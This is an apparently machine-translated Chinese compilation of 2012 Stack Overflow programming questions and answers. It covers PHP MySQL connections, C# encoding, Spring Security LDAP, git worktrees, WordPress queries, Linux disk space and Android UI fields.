函数 mysql_connect 创建或重用连接，因此如果您使用相同的凭据创建到同一服务器的多个连接，您将只获得一个连接。

如果需要强制 mysql_connect 创建新连接，则需要将 new_link 参数指定为 true，如下所示：

```
$link = mysql_connect("localhost","root","",true); 
mysql_select_db("front",$link); 
$link2 = mysql_connect("mysite.com","user","2012",true);
mysql_select_db("db1",$link2);
$link3 = mysql_connect("mysite.com","user","2012",true);
mysql_select_db("appsdb",$link3);
$link4 = mysql_connect("mysite.com","user","2012", true);
mysql_select_db("storagedb",$link4); 
```

你可以在这里找到更多信息：http: [//php.net/manual/es/function.mysql-connect.php](http://php.net/manual/es/function.mysql-connect.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:35:58.153

像这样的问题在这个网站上很猖獗，我想你搜索一个这样[的问题](https://stackoverflow.com/questions/235264/how-to-connect-to-2-databases-at-the-same-time-in-php)以获得更多帮助。

```
$db_conn = connect_db(host, user, pwd);
mysql_select_db('existing_db', $db_conn);
 -- do selects and scrub data --
mysql_select_db('new_db', $db_conn);
-- insert the required data -- 
```

完整链接[在这里](https://stackoverflow.com/questions/235264/how-to-connect-to-2-databases-at-the-same-time-in-php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:41:26.640

只需将 ",$link" 添加到查询语句的末尾...

```
mysql_query("SELECT * FROM table", $link); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-22T13:51:11.770

为什么不使用持久连接[mysql_pconnect](http://php.net/manual/en/function.mysql-pconnect.php)，而是考虑切换到[pdo](http://php.net/manual/en/pdo.connections.php)或[mysqlnd](http://php.net/manual/en/mysqlnd-ms.pooling.php)
（持久连接的对应物^([1](https://stackoverflow.com/questions/3332074/what-are-the-disadvantages-of-using-persistent-connection-in-pdo) [2](http://www.mysqlperformanceblog.com/2006/11/12/are-php-persistent-connections-evil/))）

# java - 是否允许在 MBean 中处理线程？

> ID：13845379
> 
> 赞同：1
> 
> 时间：2012-12-12T17:33:12.250
> 
> 标签：java, multithreading, ejb, jmx

根据 EJB 规范，EJB 不应在其类中处理线程。线程处理由 EJB 容器完成。但我想知道关于线程处理的 MBean 规范规则是什么？可以在 JMX MBean 中处理线程或添加同步方法/块吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:08:05.070

没关系。JMX 中没有等效的限制。

# c# - 如何在c#中解码一个utf字符串

> ID：13845383
> 
> 赞同：3
> 
> 时间：2012-12-12T17:33:37.883
> 
> 标签：c#, asp.net-mvc, encoding, character

我一直在尝试解码以下字符串：

```
CrÃ©dit 
```

在 c# 中使用以下代码：

```
 Encoding iso = Encoding.GetEncoding("ISO-8859-1");
    Encoding utf8 = Encoding.UTF8;
    string msg = iso.GetString(utf8.GetBytes(@"CrÃ©dit")); 
```

这是产生：

```
CrÃÂ©dit 
```

我在网上查看 了[http://jeppesn.dk/utf-8.html](http://jeppesn.dk/utf-8.html)，这是正确的 utf 8，应该会产生：

```
Crédit 
```

有人可以指出我哪里出错了吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:35:33.313

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:38:43.743

You're trying to do something that doesn't make sense, basically. You should almost never¹ be interpreting the output of one encoding as the input to another encoding. It's like saying, "Suppose I save this image as a gif... then load that file using a jpeg loader... what does it look like?"

I *suspect* that if you use:

```
// Just an example: don't actually do this.
string msg = utf8.GetString(iso.GetBytes(@"CrÃ©dit")); 
```

... it will do what you want, but you *shouldn't be doing this at all*.

Now, what is your *real* input (in what form) and what are you trying to achieve?

* * *

¹ If you're doing so, it's usually because someone else has already done the wrong thing, or there's a configuration problem somewhere. If you find yourself doing this, you should think very carefully about whether you should *really* be doing it, or whether you're just working around a different problem which should be tackled differently.

# php - DateTime 的范围是多少？

> ID：13845384
> 
> 赞同：0
> 
> 时间：2012-12-12T17:33:41.317
> 
> 标签：php, datetime

PHP中[日期](http://php.net/manual/en/book.datetime.php)时间的范围是多少？

即使构造函数似乎不接受范围`Y-m-d`之外格式的`[0-9999]`值，以下工作：

加一万年：

```
// 12012-12-12
echo (new DateTime())->add(new DateInterval('P10000Y'))->format('Y-m-d'); 
```

减去 10.000 年：

```
// -7988-12-12
echo (new DateTime())->sub(new DateInterval('P10000Y'))->format('Y-m-d'); 
```

我无法在文档中找到此信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:35:51.830

[http://php.net/manual/en/intro.datetime.php](http://php.net/manual/en/intro.datetime.php)

> 日期和时间信息在内部存储为 64 位数字，因此支持所有可能有用的日期（包括负年份）。范围从过去约 2920 亿年到未来相同。

# indexing - R中的意外索引现象

> ID：13845387
> 
> 赞同：0
> 
> 时间：2012-12-12T17:33:53.377
> 
> 标签：indexing

我正在从文件中读取一些映射。那么，在使用这个值的时候会出现一个奇怪的现象：

```
k <- 66
mapp[k,]
> 66   61    2.345

mapp[k,1] == 66
> TRUE

dat[1,66]
> 5

dat[1, as.numeric(mapp[k,1])]
> 7 
```

So, for some strange reason everything points to the fact that mapp[k,1] has the value 66, but when selecting the column of the matrix it is not recognizes as this value!? 为什么？我尝试通过尝试参数“stringsAsFactors”来读取映射，但这没有帮助。

有人知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:47:12.223

好吧，这是由于 R 将其解释为因子，所以 mapp[k,1] 的值是 364，可能是各个因子的索引。

问题解决了！

# spring-security - 春季安全 3.1 ldap

> ID：13845389
> 
> 赞同：0
> 
> 时间：2012-12-12T17:33:56.433
> 
> 标签：spring-security, spring-ldap

我正在尝试使用 spring security 3.1 对 ldap 服务器进行身份验证。

我对 ldap 的了解为零到很少。

在旧代码中，大约有 7 年的历史。我们有一个调用登录对象的 servlet

```
 mypackage.Login login = new mypackage.Login("*******",
                          "389",
                          "none",
                          "cn",
                          "ou=Employees, ou=**, o=ny, c=US",
                          "ou=Employees, ou=**, o=ny, c=US",
                          v);
   String[] res = login.authenticate(username, password); 
```

登录代码如下：

```
package mypackage;

import java.util.Hashtable;
import java.util.Enumeration;
import java.util.Vector;
import java.util.StringTokenizer;
import java.lang.*;
import java.util.regex.*;
import javax.naming.*;
import javax.naming.directory.*;
import mypackage.LoginErrorBean;

import javax.naming.NamingException;

public class Login 
{
  private static String INITCTX = "com.sun.jndi.ldap.LdapCtxFactory";

  private String host;
  private String port;
  private String encryption;
  private String mgrdnattrib;
  private String mgrdnpath;
  private String searchbase;
  private Vector attribs;

  private LoginErrorBean myErrors = new LoginErrorBean();

  public Login() {}

  public Login(String host,String port,String encryption,String mgrdnattrib,String mgrdnpath,String searchbase,Vector attribs) 

  {
    // Parameter settings to connect to desired LDAP service.
    // Note: the encryption piece does not seem to work at all
    this.host = host;
    this.port = port;
    this.encryption = encryption;
    this.mgrdnattrib = mgrdnattrib;
    this.mgrdnpath = mgrdnpath;
    this.searchbase = searchbase;
    this.attribs = attribs;
  }

  public String[] authenticate(String username, String password) throws NamingException
  {
     String[] authenticate;
          authenticate = new String [5];

    //Set default authentication code to false, f. Authentication is considered valid if value other than 'f' is returned for [0]
          authenticate[0] = "f";

    try {
      String MGR_DN = mgrdnattrib + "="  + username.toUpperCase() + "," + mgrdnpath;
      String MGR_PW = password;
      String provider = "ldap://" + host + ":" + port;

      // Parse atributes
      String MY_ATTRS[] = new String[attribs.size()];
      for (int i = 0; i < attribs.size(); ++i) {MY_ATTRS[i] = (String)attribs.get(i);}

      // Specify the search filter to match for general users
      String MY_FILTER ="("+ mgrdnattrib+"=*)";

      Hashtable env = new Hashtable();

      // Specify which class to use for our JNDI provider
      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
      env.put(Context.PROVIDER_URL, provider);
      env.put(Context.SECURITY_AUTHENTICATION,"simple");
      env.put(Context.SECURITY_PRINCIPAL,MGR_DN);
      env.put(Context.SECURITY_CREDENTIALS,MGR_PW);

      if ( encryption.toUpperCase().compareTo("SSL") == 0 ) {env.put(Context.SECURITY_PROTOCOL,"ssl");}

      // Specify host and port to use for directory service

      // Get a reference to a directory context
      DirContext ctx = new InitialDirContext(env);

      // Specify the scope of the search
      SearchControls constraints = new SearchControls();
      constraints.setSearchScope(SearchControls.SUBTREE_SCOPE);

      // Perform the actual search
      // We give it a searchbase, a filter and a the constraints
      // containing the scope of the search
      NamingEnumeration results = ctx.search(searchbase,MY_FILTER, constraints);

      Attribute fn = null;
      Attribute last = null;
      Attributes res = null;
      Attribute ou = null;
      Attribute tel = null;
      Attribute rm = null;
      String givenname = "";
      String ln = "";
      String area = "";
      String phone = "";
      String room = "";

        if (results != null && results.hasMore()) {

          SearchResult sr = (SearchResult) results.next();

          //Attempt to retrieve the ou
          try 
          {  res = sr.getAttributes();
             ou = res.get("ou");
             area = ou.toString();            
          } catch (Exception ex) {ex.printStackTrace();} 
          finally {}

          area.trim();

          //Given name
          try 
          { fn = res.get("givenname");
            givenname = fn.toString();
            givenname = givenname.replaceAll("givenName:","");
            givenname = givenname.trim();
            authenticate[1]=givenname;
          } catch (Exception ex) {ex.printStackTrace();} 
          finally {}

          //sn
          try 
          { last = res.get("sn");
            ln = last.toString();
            ln = ln.replaceAll("sn:","");
            ln = ln.trim();
            authenticate[2]= ln;
          } catch (Exception ex) {ex.printStackTrace();} 
          finally {}

          //Phone
          try 
          { tel = res.get("telephonenumber");
            phone = (tel.toString()==null?"No Phone":tel.toString());
            if(phone.length()==0)
            {phone="telephoneNumber:None";}
          phone = phone.replaceAll("telephoneNumber:","");
          phone = phone.trim();
          authenticate[3]= phone;
          } catch (Exception ex) {ex.printStackTrace();} 
          finally {}

          //Room
          try 
          { rm = res.get("l");
            room = rm.toString();
           if(room.length()==0)
            {room="l:None";}
          room = room.replaceAll("l:","");
          room = room.trim();
          authenticate[4]= room;
          } catch (Exception ex) {ex.printStackTrace();} 
          finally {}
          authenticate [0] = "u";
          /**
           * This section appears to check again, confirming that the username for login is the same login name found in LDAP. 
           * It seems like this is repetitive, will maintain for now however. 10/30/06 axk
          */

      }

    } catch (Exception e) {
        System.err.println("Exception: " + e.getMessage());
        authenticate[1] = e.getMessage();
        myErrors.addErrorMessage(e.toString());

    }
    return authenticate;
  }
} 
```

我正在尝试在 spring 安全文件中执行此操作：

```
 <s:ldap-authentication-provider user-search-filter="(uid={0})"
                    user-search-base="ou=Employees, ou=***, o=ny, c=US"/>

</s:authentication-manager>

    <s:ldap-server id="ldapServer" url="ldap://****:389" manager-dn="cn={0},ou=Employees, ou=nysed, o=ny, c=US" manager-password="{1}" /> 
```

这是正确的方法吗，我不确定是否

```
manager-dn="cn={0},ou=Employees, ou=nysed, o=ny, c=US" manager-password="{1}" 
```

就在安全配置文件中。

我试图在春天实现这个（它在上面显示的登录类文件中） String MGR_DN = mgrdnattrib + "=" + username.toUpperCase() + "," + mgrdnpath; 字符串 MGR_PW = 密码；

是 manager-password="{1}" 指定管理员密码与用户提供的密码相同的正确方法。?

当我尝试使用提供的适用于 java 代码的用户名进行身份验证时，出现错误。

```
<AbstractAuthenticationProcessingFilter> <doFilter> An internal error occurred while trying to authenticate the user.
org.springframework.security.authentication.InternalAuthenticationServiceException: [LDAP: error code 49 - 8009030C: LdapErr: DSID-0C0903AA, comment: AcceptSecurityContext error, data 2030, v1772
at org.springframework.security.ldap.authentication.LdapAuthenticationProvider.doAuthentication(LdapAuthenticationProvider.java:191)
    at org.springframework.security.ldap.authentication.AbstractLdapAuthenticationProvider.authenticate(AbstractLdapAuthenticationProvider.java:61)
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:156)
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:174)
    at org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter.attemptAuthentication(UsernamePasswordAuthenticationFilter.java:94)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:195)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at oracle.security.jps.ee.http.JpsAbsFilter$1.run(JpsAbsFilter.java:111)
    at java.security.AccessController.doPrivileged(Native Method)
    at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:313)
    at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:413)
    at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:94)
    at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:161)
    at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:71)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:136)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3715)
    at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3681)
    at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:321)
    at weblogic.security.service.SecurityManager.runAs(SecurityManager.java:120)
    at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2277)
    at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2183)
    at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1454)
    at weblogic.work.ExecuteThread.execute(ExecuteThread.java:209)
    at weblogic.work.ExecuteThread.run(ExecuteThread.java:178)

Caused by: org.springframework.ldap.AuthenticationException: [LDAP: error code 49 - 8009030C: LdapErr: DSID-0C0903AA, comment: AcceptSecurityContext error, data 2030, v1772

at org.springframework.ldap.support.LdapUtils.convertLdapException(LdapUtils.java:182)
    at org.springframework.ldap.core.support.AbstractContextSource.createContext(AbstractContextSource.java:266)
    at org.springframework.ldap.core.support.AbstractContextSource.getContext(AbstractContextSource.java:106)
    at org.springframework.ldap.core.support.AbstractContextSource.getReadOnlyContext(AbstractContextSource.java:125)
    at org.springframework.ldap.core.LdapTemplate.executeReadOnly(LdapTemplate.java:792)
    at org.springframework.security.ldap.SpringSecurityLdapTemplate.searchForSingleEntry(SpringSecurityLdapTemplate.java:196)
    at org.springframework.security.ldap.search.FilterBasedLdapUserSearch.searchForUser(FilterBasedLdapUserSearch.java:116)
    at org.springframework.security.ldap.authentication.BindAuthenticator.authenticate(BindAuthenticator.java:90)
    at org.springframework.security.ldap.authentication.LdapAuthenticationProvider.doAuthentication(LdapAuthenticationProvider.java:178)
    ... 34 more

Caused by: javax.naming.AuthenticationException: [LDAP: error code 49 - 8009030C: LdapErr: DSID-0C0903AA, comment: AcceptSecurityContext error, data 2030, v1772
at com.sun.jndi.ldap.LdapCtx.mapErrorCode(LdapCtx.java:3041)
    at com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:2987)
    at com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:2789)
    at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2703)
    at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:293)
    at com.sun.jndi.ldap.LdapCtxFactory.getUsingURL(LdapCtxFactory.java:175)
    at com.sun.jndi.ldap.LdapCtxFactory.getUsingURLs(LdapCtxFactory.java:193)
    at com.sun.jndi.ldap.LdapCtxFactory.getLdapCtxInstance(LdapCtxFactory.java:136)
    at com.sun.jndi.ldap.LdapCtxFactory.getInitialContext(LdapCtxFactory.java:66)
    at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:667)
    at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:288)
    at javax.naming.InitialContext.init(InitialContext.java:223)
    at javax.naming.ldap.InitialLdapContext.<init>(InitialLdapContext.java:134)
    at org.springframework.ldap.core.support.LdapContextSource.getDirContextInstance(LdapContextSource.java:43)
    at org.springframework.ldap.core.support.AbstractContextSource.createContext(AbstractContextSource.java:254)
    ... 41 more 
```

我查了一下，发现错误代码 2030 表示用户的 DN 无效。

感谢期待。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T14:09:10.987

您的应用程序代码使用 DirContext.search 方法。要从 Spring Security 端归档相同的功能，您可能需要配置 FilterBasedLdapUserSearch bean。有关详细信息，请参阅[LDAP 搜索对象](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/ldap.html#ldap-searchobjects)章节：

```
<bean id="userSearch" class="org.springframework.security.ldap.search.FilterBasedLdapUserSearch">
    <constructor-arg index="0" value=""/>
    <constructor-arg index="1" value="(uid={0})"/>
    <constructor-arg index="2" ref="contextSource" />
</bean>

<bean id="ldapAuthenticationProvider" class="org.springframework.security.ldap.authentication.LdapAuthenticationProvider">
    <constructor-arg>
        <bean class="org.springframework.security.ldap.authentication.BindAuthenticator">
            <constructor-arg ref="contextSource" />
            <property name="userSearch" ref="userSearch"/>
        </bean>
    </constructor-arg>
</bean> 
```

# git - Git 签出失败，工作树分离

> ID：13845393
> 
> 赞同：3
> 
> 时间：2012-12-12T17:34:09.290
> 
> 标签：git, config

我有一个带有分离工作树的存储库。通常，如果我需要在 repo 上工作，我可以按如下方式更改配置文件并使用类似`git status`and的命令`git checkout`：

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        worktree = /var/www/mysite.net/httpd/

#       TO PUSH REPO TO STAGE: change bare=false and uncomment the worktree 
```

但现在，我得到了错误`fatal: This operation must be run in a work tree`。我有很多网站都是这样设置的，所以我确定我只是忘记了一些东西，但我不知道是什么。谁能想到会导致这种情况的原因是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:41:28.077

愚蠢的错误。该工作树应该是.com 而不是.net。

所以我想我的答案是通常的答案——仔细检查你的拼写。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:41:50.463

通常我使用 git 级别选项让 git 像这样工作：

```
git --work-tree=some/dir --git-dir=some/other/dir push 
```

或者，您可以设置具有相同效果的环境变量。在过去的 git 版本中，像这样定义的有效活动路径对某些命令有效，而对其他命令无效。

目前我正在使用 git 级别选项，因为它们似乎适用于所有命令。

还有一件事，如果您覆盖工作树，您还需要指定 git 文件夹。即，您不能指定一个而没有另一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-09T19:56:39.180

如果我是正确的，那么根本问题是通过 cd'ing 到存储库目录，由 shell 脚本实现的 Git 命令不能与分离的工作树一起使用。（由二进制文件实现的命令在这种情况下确实有效。）要使脚本命令与分离的工作树一起工作，请 cd 到工作树并使用 GIT_DIR 环境告诉 Git 在哪里查找存储库。

# php - 使用嵌入式 wp_query 查询保留 postdata？

> ID：13845397
> 
> 赞同：2
> 
> 时间：2012-12-12T17:34:30.240
> 
> 标签：php, wordpress

我正在用 Wordpress 设计一个网站。该站点是所有页面都打印在主页上并且菜单滚动到锚点的视差站点之一。

话虽如此，我正在使用 wp_query 来拉出主菜单中的所有页面。此外，我在内容中使用的简码也需要使用 wp_query。

我遇到的问题是短代码（嵌入的 wp_query）搞砸了 postdata。我知道在使用 wp_query 时，您通常希望使用 wp_reset_postdata 但在这种特殊情况下它不起作用，因为此函数调用将恢复主页的 postdata 而不是当前正在运行的 wp_query （对不起，如果我不清楚） .

有没有办法拍摄 postdata 的快照，然后在我的简码之后恢复？我正在寻找类似的东西：

```
function my_shortcode() {
    save_postdata(); //saves the current postdata
    $query = new WP_Query();
    while( $query->have_posts() )   {
        $query->the_post();
        echo get_the_title();
    }
    my_wp_reset_postdata(); //restores the postdata to where it was before the loop
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:22:37.653

通过查看 for 的源代码[`wp_reset_query()`](http://core.trac.wordpress.org/browser/tags/3.5/wp-includes/query.php#L104)，您会看到它所做的只是`$wp_query`从另一个全局变量中恢复全局变量（`$wp_the_query`- 这是与 for 的初始设置一起设置的`$wp_query`，因此它保存了原始查询）。

你可以做的是你可以简单地分配`$wp_query`给一个不同的全局变量，然后再恢复它。这是一个例子：

```
function _save_query( $var = '_wp_query' ) {
    $GLOBALS[ $var ] = $GLOBALS['wp_query'];
}

function _wp_reset_query( $var = '_wp_query' ) {
    $GLOBALS['wp_query'] = $GLOBALS[ $var ];
    wp_reset_postdata();
} 
```

因此，只需`_save_query()`在覆盖查询之前调用（您可以传递自定义变量名称 - 这样您就可以存储多个`WP_Query`对象:)）。

一旦你想恢复查询数据，`_wp_reset_query()`再次调用 - 你可以传递一个字符串作为变量名来恢复这个确切的查询对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:58:51.473

这就是我设法让它发挥作用的方法，归功于 Nikola 的问题，因为我完成了他的想法。

```
function _save_query( $var = '_wp_query' ) {
    global $post;
    $GLOBALS[ $var ] = $post;
}

function _wp_reset_query( $var = '_wp_query' ) {
    global $post;
    $post = $GLOBALS[ $var ];
    setup_postdata( $post );
} 
```

我查看了[此处](http://core.trac.wordpress.org/browser/tags/3.5/wp-includes/query.php#L0)找到的有关循环如何工作的文档。我决定使用与 Nikola 的答案相同的设置，因为它符合我的标准，但我使用 the_post 的实现来恢复 postdata。这可能不是很有效，因为它使用了 setup_postdata 函数（我认为这是矫枉过正），但它确实解决了我的问题。

因此，现在当我嵌入 wp_query 时，我可以执行以下操作：

```
_save_query();
$products = new WP_Query( $args );
if( $products->have_posts() ) {
    $ob .= '<ul class="group-posts">';
    while ( $products->have_posts() ) {
        $products->the_post();
        $ob .= '<li>'.get_the_title().'</li>';
    }
    _wp_reset_query();
    $ob .= '</ul>';
} 
```

附带问题/说明：将答案标记为正确答案的礼仪是什么？当 Nikola 帮助我达到答案时，我会因为接受我的答案作为正确答案而感到难过？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:16:08.430

`my_wp_reset_postdata`不存在。你必须使用`wp_reset_postdata()`. 但是在您必须链接多个 wp_queries 并返回旧查询的情况下，您可以将第一个查询存储在一个变量中，设置新的 WP_query，然后将其重置并返回旧查询。

$wp_query 存储当前循环。所以你可以这样做：

```
 $temp = $wp_query;
    $wp_query= null;
    $wp_query = new WP_Query($args);
    ...

    // then later 
    $wp_query = $temp;
    // And back on tracks ! 
```

# flash - 运行 flash 时更改源

> ID：13845399
> 
> 赞同：2
> 
> 时间：2012-12-12T17:34:34.450
> 
> 标签：flash, internet-explorer-8, internet-explorer-7, video.js

我们有一个网站，客户正在使用该网站作为其 pdf 和视频的存储库。客户希望视频以模式弹出。我们正在使用花哨的盒子来做到这一点。我们遇到了 IE 7 和 IE 8 的问题。当用户点击第一个视频时，它加载没有问题。当他们关闭模式并单击一个新视频时，它会弹出第一个视频仍然显示。这是我们的代码！任何帮助将不胜感激。

```
/* Video Fancybox */
$(".video").fancybox({
    'transitionIn'          :   'fade',
    'transitionOut'         :   'fade',
    'width'                 :   535,
    'height'                :   400,
    /*'showCloseButton'       :   false,*/
    'scrolling'             :   'no',
    'titleShow'             :   false,
    'type'                  :   'inline',
    'padding'               :   10,
    'onComplete'            :   initVideo,
    'onClosed'              :   killVideo
});
//Global Video variables
var videoPlayerInitialized = false;
var myPlayer;

function initVideo(selectedArray, selectedIndex, selectedOptions)
{

    var item = selectedArray[selectedIndex];
    var videoTitle = $(item).attr('data-video');

    if (videoPlayerInitialized != true){
        myPlayer = _V_("my_video");
        videoPlayerInitialized = true;
        myPlayer.ready(function(){
            playVideo(videoTitle);
        });
    } else {
        playVideo(videoTitle);
    }

}

function playVideo(videoTitle)
{
    myPlayer.src([
        { type: "video/mp4", src: videoTitle + ".mp4" },
        { type: "video/webm", src: videoTitle + ".webm" }
    ]);
    myPlayer.load();
    myPlayer.play();        
}

function killVideo()
{
    //var myPlayer = _V_("my_video");
    myPlayer.pause();
    //myPlayer.src('');
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-01T15:28:44.640

您的 killVideo 功能只会暂停视频。它实际上并没有删除任何东西。您还需要销毁旧播放器以防止将播放器加载到彼此之上。或者您也可以使用一个播放器，但交换 src 以删除最后一个播放器并在其位置加载一个新播放器。

# linux - linux服务器上的服务器空间

> ID：13845401
> 
> 赞同：0
> 
> 时间：2012-12-12T17:34:38.293
> 
> 标签：linux, unix

我正在尝试使用“df -h”命令查找工作区 2 上可用的磁盘空间。它提供以下输出...我如何知道工作区 2 上的可用空间是多少？

```
<user:/local/mnt>ls
workspace  workspace2
<user:/local/mnt>df -h
Filesystem            Size  Used Avail Use% Mounted on
/dev/sda2             9.2G  5.1G  3.7G  59% /
none                  5.9G  308K  5.9G   1% /dev
none                  5.9G   64K  5.9G   1% /dev/shm
none                  5.9G  6.7M  5.9G   1% /var/run
none                  5.9G     0  5.9G   0% /var/lock
none                  5.9G     0  5.9G   0% /lib/init/rw
/dev/sda1             938M   61M  830M   7% /boot
/dev/sda3             3.7G  1.4G  2.2G  38% /var
/dev/sda6             122G   69G   48G  60% /local
/dev/sdb1             917G  713G  158G  82% /local/mnt2
/dev/sda7             9.2G  7.7G  1.1G  88% /usr/vice/cache
AFS                   8.6G     0  8.6G   0% /afs
sheraton:/vol/vol2/usr2/c_mkoyya
                  2.0T  1.9T  125G  94% /usr2/c_koyam
 sheraton:/vol/vol2/usr2/mkhanna
                  2.0T  1.9T  125G  94% /usr2/mkanan
freeze:/vol/eng_asw_0043/l4linux
                  200G  197G  3.7G  99% /prj/l4linux
watercooler:/vol/watercooler_vol0/watercooler/usr2/gnkala
                  3.0T  2.3T  742G  76% /usr2/gnkala
westin:/vol/vol2/usr2/longjunl
                  2.0T  1.9T   67G  97% /usr2/longjunl
sheraton:/vol/vol2/usr2/shanem
                  2.0T  1.9T  125G  94% /usr2/shanem 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T19:31:01.990

Try `df -h /local/mnt/workspace2/.`That 将确保您检查包含该目录的实际文件系统，通过任何挂载点、符号链接等进行解析...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:37:06.070

`/mnt/local/`是您挂载中的一个普通目录，`/local`位于 上，`/dev/sda6`因此您有 48GB 可用空间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:38:34.057

```
df -P /local/mnt/workspace2 | tail -1 | awk '{ print $4 }' 
```

# android - 如何打开和关闭edittext？

> ID：13845406
> 
> 赞同：0
> 
> 时间：2012-12-12T17:34:54.857
> 
> 标签：android

我有一个 EditText 字段有这个

```
android:inputType="time" 
```

我想通过按下按钮启用它（如更改时间）并在按下另一个按钮（如 Enter）完成时禁用它。有人建议您可以禁用 EditText 字段

```
textView02.setInputType(null); 
```

哪个有效，但我不知道如何让它恢复启用默认方法。

我尝试过的另一件事，它接近工作是用这个关闭场

```
textView02.setInputType(InputType.TYPE_NULL); 
```

然后用这个重新打开它

```
textView02.setInputType(InputType.TYPE_DATETIME_VARIATION_TIME); 
```

但是我得到了完整的键盘，需要切换到符号才能获得：

我以为我可以用这个

```
textView02.setInputType(InputType.TYPE_CLASS_DATETIME); 
```

但我得到了不需要的字符 / 和 - 更糟糕的是，我需要在手机上长按才能得到 : 而不是 /

PS。在一个完美的世界里，我不需要回车功能，而是依靠弹出键盘上的完成键。但我可以忍受一个专用按钮。

艾伦

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:39:05.710

```
textView02.setEnabled(false); 
```

并且要重新启用，请通过它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:38:13.210

每个类扩展`View`都有`setEnabled(boolean)`方法。

# javascript - 如何获取其他div覆盖的html文本

> ID：13845408
> 
> 赞同：0
> 
> 时间：2012-12-12T17:35:03.067
> 
> 标签：javascript, html, ios, uiwebview, z-index

事情就是这样。我可以使用该解决方案获取选定的文本：[How to replace selected text with html in a contenteditable element？](https://stackoverflow.com/questions/6251937/how-to-get-selecteduser-highlighted-text-in-contenteditable-element-and-replac)

但现在我有一个问题。我正在添加不同颜色的网站 div 以标记页面的某些部分（我只设置位置 = 绝对、顶部、左侧、宽度、高度、背景颜色和不透明度），现在当我想选择标记的文本时，选择的是那个 div（我猜它有更高的 z-index 或者其他东西将它放在其他 html 上）。现在，当我想获得选定的文本时，我什么也得不到。甚至没有那个div。只是空...知道如何获得该div覆盖的文本吗？

我认为，我在 iOS 的 UIWebView 组件中所做的所有这些事情都无关紧要。

# javascript - javascript对象上空ng-repeat的angularjs默认文本

> ID：13845409
> 
> 赞同：13
> 
> 时间：2012-12-12T17:35:05.123
> 
> 标签：javascript, angularjs

